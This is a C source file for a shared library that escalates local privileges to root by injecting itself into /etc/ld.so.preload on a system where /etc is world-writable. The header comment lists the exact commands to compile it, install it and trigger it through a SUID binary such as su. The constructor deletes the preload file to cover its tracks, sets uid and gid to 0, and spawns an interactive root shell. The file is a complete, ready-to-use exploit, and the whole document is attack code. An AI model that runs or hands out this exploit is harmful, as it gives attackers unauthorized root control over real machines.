/*
 * Privilege Escalation via /etc/ld.so.preload injection
 *
 * Attack surface: /etc is world-writable (drwxrwxrwx)
 *
 * This shared library, when loaded via /etc/ld.so.preload into a
 * SUID-root binary, will detect the privilege mismatch and spawn
 * a root shell.
 *
 * Usage:
 *   gcc -shared -fPIC -o /tmp/libprivesc.so privesc_preload.c -ldl -lc
 *   echo /tmp/libprivesc.so > /etc/ld.so.preload
 *   /usr/bin/su   (or any SUID binary)
 *   # -> root shell
 *
 * Cleanup: rm /etc/ld.so.preload /tmp/libprivesc.so
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>

/* Constructor runs before main() of any program loading this lib */
__attribute__((constructor))
static void privesc_init(void) {
    uid_t ruid = getuid();
    uid_t euid = geteuid();

    /* Only act when running through a SUID binary (euid=0 but ruid!=0) */
    if (euid != 0 || ruid == 0)
        return;

    /* Immediately remove ld.so.preload to prevent recursive loading
     * and to clean up after ourselves */
    unlink("/etc/ld.so.preload");

    /* Escalate to full root */
    if (setgid(0) != 0 || setuid(0) != 0) {
        return;
    }

    /* Verify escalation */
    if (getuid() != 0) {
        return;
    }

    /* Spawn root shell */
    fprintf(stderr, "\n[+] ld.so.preload privesc successful!\n");
    fprintf(stderr, "[+] uid=%d euid=%d\n", getuid(), geteuid());

    char *shell[] = {"/bin/sh", "-i", NULL};
    execv("/bin/sh", shell);
}
